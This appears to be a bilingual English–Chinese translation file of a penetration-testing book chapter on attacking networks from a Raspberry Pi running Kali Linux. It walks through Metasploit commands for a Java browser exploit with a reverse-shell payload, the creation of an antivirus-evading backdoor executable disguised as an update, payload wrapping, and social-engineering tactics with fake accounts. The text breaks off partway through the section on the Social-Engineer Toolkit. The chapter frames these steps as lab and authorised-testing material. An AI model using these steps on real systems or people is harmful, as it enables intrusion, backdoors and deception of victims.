- en: Chapter 4. Raspberry Pi Attacks
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 第4章。树莓派攻击
- en: In the previous chapters, we learned how to set up a Raspberry Pi for penetration
    testing. The steps included installing Kali Linux, establishing access to a target
    network, and performing basic reconnaissance. In this chapter, we will focus on
    attacking targets once your Raspberry Pi has established a foothold on a network.
    The topics include compromising systems, setting up social engineering attacks,
    exploiting Internet browsers, and developing a rogue access using tools that are
    available in Kali Linux. Some of the tools that will be covered are preinstalled
    on the Kali Linux ARM image; however, we recommend that you use the `apt-get`
    command to download the newest versions as well as update them regularly.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 在前几章中，我们学习了如何为渗透测试设置树莓派。步骤包括安装Kali Linux，建立对目标网络的访问，并执行基本的侦察。在本章中，我们将专注于在树莓派在网络上确立立足点后攻击目标。主题包括妥协系统，设置社会工程攻击，利用互联网浏览器，并使用Kali
    Linux中可用的工具开发流氓访问。将涵盖的一些工具预装在Kali Linux ARM映像上；但是，我们建议您使用`apt-get`命令下载最新版本并定期更新它们。
- en: 'In this chapter, we will cover the following topics:'
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将涵盖以下主题：
- en: Exploiting a target
  id: totrans-3
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 攻击目标
- en: Metasploit
  id: totrans-4
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Metasploit
- en: Social engineering
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 社会工程
- en: The Social-Engineer Toolkit
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 社会工程师工具包
- en: Phishing with BeEF
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用BeEF进行网络钓鱼
- en: Rogue access honeypots
  id: totrans-8
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Rogue access honeypots
- en: Easy-creds
  id: totrans-9
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Easy-creds
- en: Tip
  id: totrans-10
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 提示
- en: The Raspberry Pi has limited performance capabilities due to its size and processing
    power. Therefore, it is highly recommended that you test the following techniques
    in a lab prior to using a Raspberry Pi for a live penetration test.
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: 由于树莓派的尺寸和处理能力有限，因此强烈建议您在使用树莓派进行实时渗透测试之前在实验室中测试以下技术。
- en: Exploiting a target
  id: totrans-12
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 攻击目标
- en: Exploiting a system means taking advantage of a bug, glitch, or vulnerability
    in the system and causing unintended behavior of the system. Typically, the unintended
    behavior is permitting an attacker to gain access to a system or being taken through
    a denial-of-service technique. With regards to a Raspberry Pi that is sitting
    on a target network, the goal is to leverage the Raspberry Pi as an insider that
    will be used to attack local systems. This way, perimeter defenses will not be
    able to detect the attack unless they have visibility into the same network segment
    using behavior analytics or a **Switch Port Analyzer** (**SPAN**) tap that is
    monitored by an IPS/IDS. We find that many administrators place their best security
    defenses on the edge of their network, making them blind to host-to-host communication.
    This is the ideal situation for placing a Raspberry Pi on such a network and controlling
    it using a remote connection from anywhere in the world. You will see diagrams
    of this attack model in many sections of this chapter.
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: 利用系统意味着利用系统中的错误、故障或漏洞，并导致系统的意外行为。通常，意外行为是允许攻击者访问系统或通过拒绝服务技术进行攻击。关于坐落在目标网络上的树莓派，目标是利用树莓派作为内部人员，用于攻击本地系统。这样，除非周界防御具有对相同网络段的可见性，否则它们将无法检测到攻击，使用行为分析或由IPS/IDS监视的**交换机端口分析器**（SPAN）镜像。我们发现许多管理员将最佳安全防御措施放在网络边缘，使他们对主机之间的通信视而不见。这是在这样的网络上放置树莓派并使用来自世界各地的远程连接控制它的理想情况。您将在本章的许多部分看到这种攻击模型的图表。
- en: A full-blown installation of Kali Linux has a ton of applications that are available
    to exploit systems; however, many of these tools do not come preinstalled on the
    Kali Linux ARM image. You can install most of the missing tools using the `apt-get`
    command, but some won't function properly or will render the Raspberry Pi useless
    by consuming too much processing power. For this reason, we have designed this
    chapter around very specific attacks that are customized for a Raspberry Pi.
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: Kali Linux的完整安装有大量可用于利用系统的应用程序；但是，其中许多工具未预装在Kali Linux ARM映像上。您可以使用`apt-get`命令安装大多数缺失的工具，但有些工具可能无法正常运行，或者会通过消耗过多的处理能力使树莓派无法使用。因此，我们设计了本章围绕树莓派定制的非常具体的攻击。
- en: 'Let''s start off by building an attack using the most popular exploit framework:
    Metasploit.'
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们从使用最流行的利用框架Metasploit构建攻击开始。
- en: Metasploit
  id: totrans-16
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: Metasploit
- en: The Metasploit Project is seen by many as the de facto standard for executing
    exploit code against a target machine. The Metasploit Framework contains hundreds
    of working exploits for a variety of platforms. Attackers can include payloads,
    encoders, and **no-operation** (**NOP**) slide generators with an exploit module
    to solve almost any exploit-related attack. The key to Metasploit's popularity
    is that it has weaponized complex attacks in a scripted format so that the average
    user can launch sophisticated attacks in minutes. You can learn more about Metasploit
    at [www.metasploit.com](http://www.metasploit.com).
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit项目被许多人视为针对目标机器执行利用代码的事实标准。Metasploit框架包含各种平台的数百个可用利用。攻击者可以在利用模块中包含有效载荷、编码器和**无操作**（NOP）幻灯片生成器，以解决几乎任何与利用相关的攻击。Metasploit流行的关键在于它将复杂的攻击武器化为脚本格式，以便普通用户可以在几分钟内发动复杂的攻击。您可以在[www.metasploit.com](http://www.metasploit.com)了解更多关于Metasploit的信息。
- en: 'The Metasploit Framework has many different tools that can be used to exploit
    systems. The available tools are as follows:'
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit框架有许多不同的工具可用于利用系统。可用的工具如下：
- en: '**Msfcli**: This is a command-line interface to the framework that allows a
    user to launch exploits or attacks through scripts.'
  id: totrans-19
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Msfcli**：这是一个命令行界面，允许用户通过脚本启动利用或攻击的框架。'
- en: '**Msfconsole**: This is the most popular way to access Metasploit. Msfconsole
    provides access to the entire framework through a series of context-driven command
    prompts.'
  id: totrans-20
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Msfconsole**：这是访问Metasploit最流行的方式。Msfconsole通过一系列上下文驱动的命令提示符提供对整个框架的访问。'
- en: '**Exploits**: Exploits will compromise a victim machine and they can be broken
    down into active and passive exploits. Active exploits run until shell access
    is achieved or the exploit is stopped because of some sort of exception error.
    In the following screenshot, we show an active exploit as the attacker executes
    the attack until they have access to the victim''s machine through a shell:![Metasploit](img/Insert6435OT_04_01.jpg)'
  id: totrans-21
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**漏洞利用**：漏洞利用将危害受害者机器，它们可以分为主动和被动漏洞利用。主动漏洞利用一直运行，直到获得shell访问或者因为某种异常错误而停止利用。在下面的屏幕截图中，我们展示了一个主动漏洞利用，因为攻击者执行攻击，直到他们通过shell访问受害者的机器：![Metasploit](img/Insert6435OT_04_01.jpg)'
- en: Passive exploits on the other hand wait until a victim machine connects to Metasploit
    and then Metasploit runs the attack. The difference between active and passive
    exploits is that Metasploit will initiate a connection in an active exploit while
    it will wait for the victim in a passive attack.
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: 另一方面，被动漏洞利用会等待受害者机器连接到Metasploit，然后Metasploit运行攻击。主动和被动漏洞利用的区别在于，Metasploit在主动利用中会发起连接，而在被动攻击中会等待受害者。
- en: '**Payloads**: Metasploit allows attackers to use single stagers and stages
    as payloads. The description of these and when to use them can get complicated
    and is out of scope for a Raspberry Pi-based book. We suggest you look for more
    information at the Metasploit Unleashed home page that is referenced at the end
    of this section in the tip.'
  id: totrans-23
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**载荷**：Metasploit允许攻击者使用单级和多级作为载荷。这些的描述以及何时使用它们可能会变得复杂，超出了基于Raspberry Pi的书籍的范围。我们建议您在本节末尾引用的Metasploit
    Unleashed主页上寻找更多信息。'
- en: '**Database**: Metasploit has built-in support for the PostgreSQL database system.
    This database system allows attackers to keep track of hosts, networks, and vulnerabilities.
    One of the main purposes of using the built-in database in Metasploit is to keep
    track of what you discover and help with documentation for future attacks and
    reporting.'
  id: totrans-24
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**数据库**：Metasploit内置支持PostgreSQL数据库系统。这个数据库系统允许攻击者跟踪主机、网络和漏洞。在Metasploit中使用内置数据库的主要目的之一是跟踪您发现的内容，并帮助记录未来的攻击和报告。'
- en: '**Meterpreter**: This is one of the most powerful resources in Metasploit.
    It is dynamic in regards to memory payload. Depending on the exploited system,
    the nature of the vulnerability, and how it was run, Meterpreter can provide attackers
    full shell features and remote control of a victim machine.'
  id: totrans-25
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Meterpreter**：这是Metasploit中最强大的资源之一。它在内存载荷方面是动态的。根据被攻击的系统、漏洞的性质以及运行方式，Meterpreter可以为攻击者提供完整的shell功能和对受害者机器的远程控制。'
- en: Tip
  id: totrans-26
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 提示
- en: There are many great books and resources that are available to learn Metasploit.
    One suggestion is the free Offensive Security introduction of Metasploit Unleashed
    at [http://www.offensive-security.com/metasploit-unleashed/Main_Page](http://www.offensive-security.com/metasploit-unleashed/Main_Page).
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 有许多优秀的书籍和资源可供学习Metasploit。一个建议是免费的Offensive Security Metasploit Unleashed介绍，网址为[http://www.offensive-security.com/metasploit-unleashed/Main_Page](http://www.offensive-security.com/metasploit-unleashed/Main_Page)。
- en: 'With regards to a Raspberry Pi, some of the Metasploit modules do not function
    properly when run from the Kali Linux ARM image. For this reason, we suggest that
    you only launch very specific attacks. For our example, we will assume that the
    Raspberry Pi has access to the inside network and you would like to identify a
    target to breach. The steps to exploit a local system are as follows:'
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: 关于Raspberry Pi，当从Kali Linux ARM映像运行时，一些Metasploit模块无法正常运行。因此，我们建议您只发起非常具体的攻击。在我们的例子中，我们将假设Raspberry
    Pi可以访问内部网络，并且您想要识别一个目标进行入侵。攻击本地系统的步骤如下：
- en: Identify a target using Nmap to scan the network.
  id: totrans-29
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 使用Nmap扫描网络来识别目标。
- en: Scan the target for possible vulnerabilities using Nmap.
  id: totrans-30
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 使用Nmap扫描目标，寻找可能的漏洞。
- en: Search Metasploit for attacks that match the vulnerabilities identified during
    the Nmap scan.
  id: totrans-31
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在Metasploit中搜索与Nmap扫描期间识别的漏洞相匹配的攻击。
- en: Launch an attack against a vulnerability.
  id: totrans-32
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 对漏洞发起攻击。
- en: If you are successful, you will obtain access to the system.
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: 如果成功的话，您将获得对系统的访问权限。
- en: 'The following diagram represents how this attack would look on a target network:'
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: 以下图表表示这种攻击在目标网络上的样子：
- en: '![Metasploit](img/Insert6435OT_04_02.jpg)'
  id: totrans-35
  prefs: []
  type: TYPE_IMG
  zh: '![Metasploit](img/Insert6435OT_04_02.jpg)'
- en: Let's walk through using Metasploit to compromise a system on the local network.
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们通过使用Metasploit来危害本地网络上的系统。
- en: To launch Metasploit, from a command-line window, type the `msfconsole` command.
    It can take Metasploit a few minutes to launch on Raspberry Pi.
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: 要启动Metasploit，从命令行窗口输入`msfconsole`命令。在Raspberry Pi上启动Metasploit可能需要几分钟的时间。
- en: 'The following screenshot shows the launch of Metasploit on Raspberry Pi:'
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 以下屏幕截图显示了在Raspberry Pi上启动Metasploit：
- en: '![Metasploit](img/Insert6435OT_04_03.jpg)'
  id: totrans-39
  prefs: []
  type: TYPE_IMG
  zh: '![Metasploit](img/Insert6435OT_04_03.jpg)'
- en: Once you are in Metasploit using `msfconsole`, you will see a new command prompt.
    Let's use an exploit against a target. In this example, we will demo a Java exploit.
    To accomplish this, type the `use exploit/multi/browser/java_jre17_ exec` command.
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦您在Metasploit中使用`msfconsole`，您将看到一个新的命令提示符。让我们针对一个目标使用一个漏洞。在这个例子中，我们将演示一个Java漏洞。为了实现这一点，输入`use
    exploit/multi/browser/java_jre17_ exec`命令。
- en: 'The following screenshot shows the launch of the preceding command:'
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
  zh: 以下屏幕截图显示了上述命令的启动：
- en: '![Metasploit](img/Insert6435OT_04_04.jpg)'
  id: totrans-42
  prefs: []
  type: TYPE_IMG
  zh: '![Metasploit](img/Insert6435OT_04_04.jpg)'
- en: This will change your prompt to `msf exploit`. Next, we will deliver a payload
    with Metasploit that will spawn a reverse shell. A **reserve shell** is a command
    prompt that an attacker accesses locally from their PC that has been used for
    the attack while running commands on a remote victim's target system. We will
    use the `set PAYLOAD java/ shell/reverse_tcp` command to set the payload. You
    will see the **PAYLOAD =>** shell with your setting, which will confirm that it
    has been accepted.
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: 这将把您的提示更改为`msf exploit`。接下来，我们将使用Metasploit交付一个生成反向shell的有效载荷。**反向shell**是攻击者从其PC本地访问的命令提示符，用于攻击远程受害者目标系统时运行命令。我们将使用`set
    PAYLOAD java/shell/reverse_tcp`命令设置有效载荷。您将看到**PAYLOAD =>** shell与您的设置，这将确认它已被接受。
- en: In order for the attack to work, the attacker must set up options in the payload.
    You can view the available options by typing the `show options` command. Some
    options are required while others are not, depending on how they are labeled when
    you use the `show options` command. This particular payload only requires one
    option, which is the `LHOST` option. `LHOST` is the attacker's local IP address.
    This tells Metasploit, when the payload has been delivered to the victim, how
    the victim will connect back to the attacker. You will need to ensure that the
    IP address of the attacker's machine (`LHOST`) is reachable by the victim's machine
    in order to establish a connection once this attack is executed successfully.
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: 为了使攻击生效，攻击者必须在有效载荷中设置选项。您可以通过输入`show options`命令查看可用选项。一些选项是必需的，而其他选项则取决于您在使用`show
    options`命令时标记它们的方式。这个特定的有效载荷只需要一个选项，即`LHOST`选项。`LHOST`是攻击者的本地IP地址。这告诉Metasploit，当有效载荷传递给受害者时，受害者将如何连接回攻击者。您需要确保攻击者机器的IP地址（`LHOST`）可以被受害者机器访问，以便在成功执行此攻击后建立连接。
- en: 'To configure the `LHOST` option, type `set LHOST IP_Address_of_Kali`, where
    the address of Kali is the IP address of the Raspberry Pi hosting Kali Linux.
    You can verify the change by using the `show options` command and see that the
    `LHOST` name now has a value. The following screenshot shows the setting of the
    `LHOST` name to `192.168.1.10`:'
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 要配置`LHOST`选项，请输入`set LHOST Kali的IP地址`，其中Kali的地址是托管Kali Linux的树莓派的IP地址。您可以使用`show
    options`命令验证更改，并查看`LHOST`名称现在是否有一个值。以下屏幕截图显示了`LHOST`名称设置为`192.168.1.10`：
- en: '![Metasploit](img/Insert6435OT_04_05.jpg)'
  id: totrans-46
  prefs: []
  type: TYPE_IMG
  zh: '![Metasploit](img/Insert6435OT_04_05.jpg)'
- en: Type the `exploit` command to execute the payload with your options.
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: 输入`exploit`命令以执行带有您选项的有效载荷。
- en: If your victim is running an exploitable version of Java, you will get a reverse
    shell to the victim machine. To test the exploit, go to the victim machine, open
    up a web browser, and browse the machine hosting Kali Linux. For our example,
    this would be `192.168.1.10`.
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 如果您的受害者正在运行一个可利用的Java版本，您将获得对受害者机器的反向shell。要测试该漏洞，转到受害者机器，打开一个Web浏览器，并浏览托管Kali
    Linux的机器。对于我们的示例，这将是`192.168.1.10`。
- en: Normally, a victim would not knowingly browse an attacker's machine; however,
    this is a good way to test whether your exploit works in a lab environment. Real-world
    attackers will place a link in a sophisticated web page, such as in an iFrame
    hidden in an innocent looking web page. There are many other attacks that can
    take advantage of remote exploits so that the attackers can launch a payload as
    well.
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 通常，受害者不会自愿浏览攻击者的机器；然而，这是在实验室环境中测试您的漏洞是否有效的好方法。真实世界的攻击者会在精心制作的网页中放置一个链接，比如在一个看似无害的网页中隐藏的iFrame中。还有许多其他攻击可以利用远程漏洞，以便攻击者也可以启动有效载荷。
- en: Once the victim browses the attacker's machine running the exploit, the payload
    will be loaded and the victim will be exploited, giving the attacker shell (command
    line) access to the victim's machine.
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦受害者浏览攻击者运行漏洞的机器，有效载荷将被加载，受害者将被利用，使攻击者可以访问受害者机器的shell（命令行）。
- en: Tip
  id: totrans-51
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 提示
- en: You can test this attack by installing an older exploitable version of Java
    on a test victim machine. Java 1.0.7_6 is a possible option to use for testing.
    You can find older versions of Java on Oracle's website at [http://www.oracle.com/technetwork/java/archive-139210.html](http://www.oracle.com/technetwork/java/archive-139210.html).
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: 您可以通过在测试受害者机器上安装一个旧版本的Java来测试此攻击。Java 1.0.7_6是一个可能用于测试的选项。您可以在Oracle的网站上找到Java的旧版本，网址为[http://www.oracle.com/technetwork/java/archive-139210.html](http://www.oracle.com/technetwork/java/archive-139210.html)。
- en: Creating your own payloads with Metasploit
  id: totrans-53
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用Metasploit创建自己的有效载荷
- en: Another popular way to use Metasploit is to create malicious payloads. Payloads
    in computing terms mean a data transmission. When we refer to a malicious payload,
    we are talking about adding something unwanted by the victim to the data transfer
    such as a backdoor. Metasploit offers tons of payload options that can provide
    root access to systems once they are installed.
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: 使用Metasploit的另一种流行方式是创建恶意有效载荷。在计算术语中，有效载荷意味着数据传输。当我们提到恶意有效载荷时，我们指的是向数据传输中添加受害者不希望的内容，比如后门。Metasploit提供了大量有效载荷选项，可以在安装后为系统提供根访问权限。
- en: Most security solutions such as anti-virus or IPS are designed to detect payloads.
    However, Metasploit includes encoders to bypass these traditional defenses. Encoding
    means to add random data to the file so that it looks different than what it really
    is. Most traditional security defenses leverage lists of known threats that are
    also known as signatures, which means that if a threat is not on that list, it
    is not detected. Encoding provides a way to make a payload look unique enough
    to not trigger a known signature and beat traditional defenses. Some people call
    this a "day zero" threat, meaning none of the commercial vendors have a signature
    for the threat to detect it.
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: 大多数安全解决方案，如防病毒软件或IPS，都是设计用于检测有效载荷。然而，Metasploit包括编码器来绕过这些传统的防御措施。编码意味着向文件添加随机数据，使其看起来与实际情况不同。大多数传统安全防御利用已知威胁的列表，也称为签名，这意味着如果威胁不在该列表上，它就不会被检测到。编码提供了一种使有效载荷看起来足够独特，以免触发已知签名并击败传统防御措施的方法。有些人称之为“零日”威胁，这意味着商业供应商都没有该威胁的签名来检测它。
- en: For the next attack, we will create a payload, encode it so that it bypasses
    traditional security defenses, and place it on a target system. Payloads can be
    delivered through e-mail or USB, or if an exploit is successful enough to get
    basic system access, the payload can be placed on the target system to escalate
    the attacker's level of access rights on that system.
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
  zh: 对于下一次攻击，我们将创建一个载荷，对其进行编码，以便绕过传统的安全防御，并将其放在目标系统上。载荷可以通过电子邮件或USB传递，或者如果利用足够成功以获得基本系统访问权限，则可以将载荷放置在目标系统上，以提升攻击者在该系统上的访问权限级别。
- en: Tip
  id: totrans-57
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 提示
- en: The best practice is to create payloads in a more powerful system and transport
    them through the Raspberry Pi rather than creating them directly in the Raspberry
    Pi.
  id: totrans-58
  prefs: []
  type: TYPE_NORMAL
  zh: 最佳实践是在更强大的系统中创建载荷，并通过树莓派传输它们，而不是直接在树莓派中创建它们。
- en: Let's look at how to develop a payload and encode it with Metasploit.
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们看看如何开发一个载荷并用Metasploit对其进行编码。
- en: The first step is to open Metasploit and type `msfconsole` in the command terminal.
    After a minute or so, you will see the Metasploit introduction page.
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 第一步是打开Metasploit并在命令终端中输入`msfconsole`。大约一分钟后，您将看到Metasploit的介绍页面。
- en: 'You can generate payloads by accessing the `msfpayload` subsection. Payload
    options can be seen using the `msfpayload –h` command to view available formats
    and the `msfpayload –l` command to see the actual payload options. For our example,
    we''ve pulled up one of the most popular exploits, known as the `reverse_tcp`
    payload, which is used to exploit a Windows system. The following screenshot demonstrates
    selecting this payload and configuring the listening address, which is our system''s
    IP address to listen on port `4444`:'
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 您可以通过访问`msfpayload`子部分来生成载荷。可以使用`msfpayload –h`命令查看可用格式和`msfpayload –l`命令查看实际载荷选项。对于我们的示例，我们选择了最流行的漏洞之一，称为`reverse_tcp`载荷，用于利用Windows系统。以下截图演示了选择此载荷并配置监听地址，即我们系统的IP地址以监听端口`4444`：
- en: '![Creating your own payloads with Metasploit](img/Insert6435OT_04_06.jpg)'
  id: totrans-62
  prefs: []
  type: TYPE_IMG
  zh: '![使用Metasploit创建自己的载荷](img/Insert6435OT_04_06.jpg)'
- en: 'Metasploit can produce different file formats for an exploit. In our example,
    we will create an executable file called `important.exe` so that the victim believes
    it to be an important update. Note that this is where social engineering comes
    into play, meaning you can name this executable file something the user expects
    to install and include it with a social engineering campaign. To create the `important.exe`
    file, use the `X > important.exe` command after the original payload. The following
    screenshot shows the creation of this file:'
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit可以为攻击生成不同的文件格式。在我们的示例中，我们将创建一个名为`important.exe`的可执行文件，以便受害者相信它是一个重要的更新。请注意，这就是社会工程学发挥作用的地方，这意味着您可以将这个可执行文件命名为用户期望安装的内容，并将其包含在社会工程活动中。要创建`important.exe`文件，请在原始载荷之后使用`X
    > important.exe`命令。以下截图显示了创建此文件的过程：
- en: '![Creating your own payloads with Metasploit](img/Insert6435OT_04_07.jpg)'
  id: totrans-64
  prefs: []
  type: TYPE_IMG
  zh: '![使用Metasploit创建自己的载荷](img/Insert6435OT_04_07.jpg)'
- en: 'After creating the file, you can find the file in your `root` folder. The hard
    part is coming up with a clever method to get a victim to install the file. If
    you can convince a Windows user to install it, you will be granted a backdoor
    with root access to that system, assuming everything functions as expected. This
    concept can be useful for other attack examples presented later in this chapter.
    The following screenshot shows our `important.exe` file on a target computer:'
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: 创建文件后，您可以在`root`文件夹中找到该文件。困难的部分是想出一个巧妙的方法来让受害者安装该文件。如果您能说服Windows用户安装它，假设一切都按预期运行，您将被授予对该系统的具有root权限的后门。这个概念对本章后面介绍的其他攻击示例可能会有用。以下截图显示了我们在目标计算机上的`important.exe`文件：
- en: '![Creating your own payloads with Metasploit](img/Insert6435OT_04_08.jpg)'
  id: totrans-66
  prefs: []
  type: TYPE_IMG
  zh: '![使用Metasploit创建自己的载荷](img/Insert6435OT_04_08.jpg)'
- en: Wrapping payloads
  id: totrans-67
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 包装载荷
- en: Another method to hide a payload is wrapping it with a trusted application.
    For example, you can inform a victim that their Adobe Reader is out of date and
    wrap the proper upgrade file with a backdoor. When the victim installs the `.exe`
    file, they will get the update and an unwanted backdoor.
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: 隐藏载荷的另一种方法是将其与受信任的应用程序进行包装。例如，您可以告诉受害者他们的Adobe Reader已过期，并将正确的升级文件与后门进行包装。当受害者安装`.exe`文件时，他们将获得更新和一个不需要的后门。
- en: This can be a very effective way to complement a targeted social engineering
    attack. We will refer to this approach in the *Phishing with BeEF* section later
    in this chapter, where we will have a popup that will trick a user to click and
    download a wrapped payload.
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: 这可以是一个非常有效的方式来补充有针对性的社会工程攻击。我们将在本章后面的*使用BeEF进行网络钓鱼*部分中提到这种方法，那里我们将有一个弹出窗口，会欺骗用户点击并下载一个包装的载荷。
- en: Wrapping payloads is out of scope for a Raspberry Pi penetration testing book.
    There are tools available such as Senna that are designed for this purpose. The
    following screenshot shows the **Senna Spy One** dashboard wrapping a **ROOTKIT**
    payload with the Windows calculator executable file. When a user runs the file,
    the calculator will pop up and the **ROOTKIT** payload will be installed. You
    can learn more about wrapping payloads by researching Senna or other wrapper tools.
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: 包装载荷超出了树莓派渗透测试书的范围。有一些工具可用，比如Senna，专门用于此目的。以下截图显示了**Senna Spy One**仪表板将**ROOTKIT**载荷与Windows计算器可执行文件进行包装。当用户运行该文件时，计算器将弹出，**ROOTKIT**载荷将被安装。您可以通过研究Senna或其他包装工具来了解更多关于包装载荷的信息。
- en: '![Wrapping payloads](img/Insert6435OT_04_9.jpg)'
  id: totrans-71
  prefs: []
  type: TYPE_IMG
  zh: '![包装载荷](img/Insert6435OT_04_9.jpg)'
- en: Social engineering
  id: totrans-72
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 社会工程学
- en: Social engineering attacks are designed to trick a victim into providing information
    through misdirection or deceit. Attackers often pretend to be someone they are
    not, such as someone with authority or a family member, to gain a victim's trust.
    When they are successful, users might have given up passwords, access credentials,
    or other valuable secrets. There are stories about famous hackers who have been
    able to obtain intellectual property just by asking for it with a smile.
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: 社会工程攻击旨在通过误导或欺骗诱使受害者提供信息。攻击者经常假装成他们不是的人，比如有权威的人或家庭成员，以获取受害者的信任。当他们成功时，用户可能已经泄露了密码、访问凭据或其他有价值的秘密。有关著名黑客的故事，他们仅凭微笑就能获得知识产权。
- en: There are many tools that are available in Kali Linux to assist with a social
    engineering campaign; however, the most successful attacks are based on understanding
    your target audience and abusing their trust. For example, we have obtained sensitive
    information using fake accounts on social media sources such as LinkedIn and Facebook,
    which didn't require any advanced techniques to accomplish most of our goals.
    Other examples include calling somebody while pretending that you are an administrator
    or sending e-mails claiming to be a long-lost family member.
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: Kali Linux中有许多工具可用于辅助社会工程活动；然而，最成功的攻击是基于了解目标受众并滥用他们的信任。例如，我们曾在社交媒体来源如LinkedIn和Facebook上使用假账户获取敏感信息，这并不需要任何高级技术来实现我们大部分的目标。其他例子包括假装成管理员给某人打电话，或发送声称是久违的家庭成员的电子邮件。
- en: Note
  id: totrans-75
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: You can learn more about the authors' research on executing a penetration test
    using social media by searching for "Emily Williams Social Engineering" on Google
    or at [http://www.thesecurityblogger.com/?p=1903](http://www.thesecurityblogger.com/?p=1903)
    and [http://www.pcworld.com/article/2059940/fake-social-media-id-duped-securityaware-it-guys.html](http://www.pcworld.com/article/2059940/fake-social-media-id-duped-securityaware-it-guys.html).
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 您可以通过在Google上搜索"Emily Williams Social Engineering"或访问[http://www.thesecurityblogger.com/?p=1903](http://www.thesecurityblogger.com/?p=1903)和[http://www.pcworld.com/article/2059940/fake-social-media-id-duped-securityaware-it-guys.html](http://www.pcworld.com/article/2059940/fake-social-media-id-duped-securityaware-it-guys.html)了解更多关于作者在使用社交媒体进行渗透测试的研究。
- en: In this chapter, we focus on one of the most popular social engineering attack
    tools known as SET. SET can be launched from a Raspberry Pi, but it will probably
    function better from a more powerful system. The best practice is leveraging a
    Raspberry Pi for on-site reconnaissance that can be used to build a successful
    social engineering attack that is executed from a remote web server.
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将重点介绍一种名为SET的最受欢迎的社会工程攻击工具。SET可以从树莓派上启动，但在更强大的系统上可能会更好地运行。最佳实践是利用树莓派进行现场侦察，以构建成功的社会工程攻击，并从远程Web服务器执行。
- en: We will follow the discussion of SET with another popular social engineering
    tool that is used to exploit browsers. This is known as BeEF.
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将在SET的讨论之后介绍另一个流行的社会工程工具，用于利用浏览器。这就是BeEF。
- en: The Social-Engineer Toolkit
  id: totrans-79
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 社会工程工具包
- en: The **Social-Engineer Toolkit** (**SET**) was developed by David Kennedy at
    TrustSec and it comes preinstalled with Kali Linux. It is often used to duplicate
    trusted websites such as Google, Facebook, and Twitter with the purpose of attracting
    victims to launch attacks against them. As victims unknowingly browse these duplicate
